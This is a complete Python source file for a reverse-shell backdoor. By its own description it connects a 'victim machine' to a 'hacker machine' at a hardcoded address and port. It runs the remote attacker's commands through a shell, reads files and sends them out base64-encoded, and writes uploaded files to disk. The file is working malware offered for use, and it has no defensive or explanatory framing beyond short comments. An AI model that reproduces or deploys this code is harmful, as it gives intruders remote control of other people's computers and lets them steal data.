#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64

"""
Program that connect a victim machine to hacker machine and allows 
hacker to use terminal commands inside a victim machine
"""


class Backdoor:
	def __init__(self, ip, port):
		# Connecting to hacker's machine port
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	# Method that return output of command that hacker entered

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	# Method that convert data into json object

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	# Method that collect json object from hacker machine

	def reliable_receive(self):
		json_data = b""
		while True:
			try:
				json_data += self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	# Method that allows hacker to use "cd" command

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	# Method to read and convert file into base64 encode data

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	# Method that allows to read encoded by base64 data

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successfully."

	# Main Method

	def run(self):
		while True:
			command = self.reliable_receive()

			try:
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1]).decode()
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_system_command(command).decode()
			except Exception:
				command_result = "[-] Error during comand execution"

			self.reliable_send(command_result)

my_backdoor = Backdoor("10.211.55.5", 4444)
my_backdoor.run()